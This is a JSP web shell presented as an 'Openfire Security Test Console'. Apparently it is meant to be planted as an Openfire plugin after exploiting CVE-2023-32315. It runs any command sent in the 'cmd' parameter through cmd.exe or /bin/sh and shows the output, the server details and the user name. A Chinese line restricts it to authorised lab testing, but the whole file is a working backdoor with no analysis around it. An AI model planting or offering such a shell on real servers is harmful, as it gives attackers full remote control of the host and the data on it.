<%@ page import="java.io.*" %>
<%@ page contentType="text/html; charset=UTF-8" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null && !cmd.isEmpty()) {
        Process p = null;
        try {
            String os = System.getProperty("os.name").toLowerCase();
            String[] shellCmd;
            if (os.contains("win")) {
                shellCmd = new String[]{"cmd.exe", "/c", cmd};
            } else {
                shellCmd = new String[]{"/bin/sh", "-c", cmd};
            }
            p = Runtime.getRuntime().exec(shellCmd);

            // 读取标准输出
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8"));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            reader.close();

            // 读取错误输出
            BufferedReader errReader = new BufferedReader(new InputStreamReader(p.getErrorStream(), "UTF-8"));
            while ((line = errReader.readLine()) != null) {
                output.append(line).append("\n");
            }
            errReader.close();

            p.waitFor();
            request.setAttribute("result", output.toString());
        } catch (Exception e) {
            request.setAttribute("result", "Error: " + e.getMessage());
        }
    }
%>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Test Console</title>
    <style>
        body { background: #1a1a2e; color: #e0e0e0; font-family: Consolas, monospace; margin: 0; padding: 20px; }
        h2 { color: #e94560; border-bottom: 1px solid #e94560; padding-bottom: 10px; }
        .warning { color: #f0a500; font-size: 13px; margin-bottom: 15px; }
        input[type="text"] { width: 70%; padding: 8px; background: #16213e; border: 1px solid #0f3460; color: #e0e0e0; font-family: Consolas, monospace; }
        input[type="submit"] { padding: 8px 20px; background: #e94560; border: none; color: #fff; cursor: pointer; font-weight: bold; }
        pre { background: #16213e; padding: 15px; border: 1px solid #0f3460; min-height: 200px; white-space: pre-wrap; word-wrap: break-word; }
        .info { color: #888; font-size: 12px; margin-top: 20px; }
    </style>
</head>
<body>
    <h2>Openfire Security Test Console</h2>
    <div class="warning">[!] 仅限授权安全测试使用 - CVE-2023-32315 靶场验证</div>

    <form method="post">
        <input type="text" name="cmd" placeholder="输入要执行的命令..." value="<%= cmd != null ? cmd.replace("\"", "&quot;") : "id" %>" />
        <input type="submit" value="Execute" />
    </form>

    <h3>Output:</h3>
    <pre><%
        String result = (String) request.getAttribute("result");
        if (result != null && !result.isEmpty()) {
            out.print(result);
        } else if (cmd != null) {
            out.print("(no output)");
        } else {
            out.print("输入命令后点击 Execute 查看结果...");
        }
    %></pre>

    <div class="info">
        Server: <%= application.getServerInfo() %><br>
        OS: <%= System.getProperty("os.name") %> | User: <%= System.getProperty("user.name") %><br>
        Plugin path: /plugins/securitytest/
    </div>
</body>
</html>
